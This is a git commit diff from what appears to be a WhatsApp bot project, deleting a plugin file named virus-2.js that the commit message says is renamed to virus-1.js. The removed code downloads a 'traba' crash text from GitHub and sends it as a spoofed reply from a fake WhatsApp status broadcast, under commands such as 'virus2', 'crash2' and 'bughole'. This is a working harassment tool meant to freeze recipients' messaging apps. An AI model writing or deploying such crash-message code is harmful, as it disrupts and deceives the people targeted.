88dc501767b5e4ded198a58f2dcd2286036b829e
DIEGO-OFC <107585310+DIEGO-OFC@users.noreply.github.com>
2022-10-08 18:00:52 -0400

    Update and rename virus-2.js to virus-1.js

--- plugins/virus-2.js
+++
@@ -1,8 +0,0 @@
-import fecth from 'node-fetch'
-let handler  = async (m, { conn }) => {
-let info = await fetch('https://raw.githubusercontent.com/DIEGO-OFC/DORRAT-BOT-MD/blob/main/galeria/traba.txt').then(v => v.text());
-conn.fakeReply(m.chat, info, '0@s.whatsapp.net', '🔥 *by   ͩ ͥ ͤ ᷚ ͦ- ͦ ᷫ  ⷭ⁩* 🔥', 'status@broadcast')}
-handler.command = ['virus2', 'c2', 'binario2', 'traba2', 'crash2', 'bughole'] 
-handler.rowner = true
-handler.fail = null
-export default handler 
